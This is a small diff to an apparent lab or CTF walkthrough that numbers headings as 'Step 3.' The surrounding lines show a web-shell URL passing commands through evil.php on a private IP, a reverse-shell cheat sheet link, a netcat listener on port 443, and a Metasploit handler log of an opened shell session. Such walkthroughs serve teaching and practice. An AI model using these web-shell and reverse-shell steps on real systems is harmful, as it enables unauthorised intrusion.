@@ -107,7 +107,7 @@ http://192.168.114.132/test/evil.php?cmd=192.168.114.132/test/test.php?cmd=/usr/
 ```
 OR just use one of http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-##### Listen on port 443
+##### Step 3. Listen on port 443
 
 ```
 nc -lvp 443
@@ -160,7 +160,8 @@ Using the same shell, we can get a root shell.
 
 WGET does not seem to work, so we upload through the same way in the previous section.
 
-#### Listen on Port 443 and Wait.
+#### Step 3. Listen on Port 443 and Wait.
+
 Using msfconsole/exploit/multi/handler 
 ```
 Command shell session 5 opened (192.168.114.131:443 -> 192.168.114.132:37026) at 2018-03-02 18:16:55 +1100
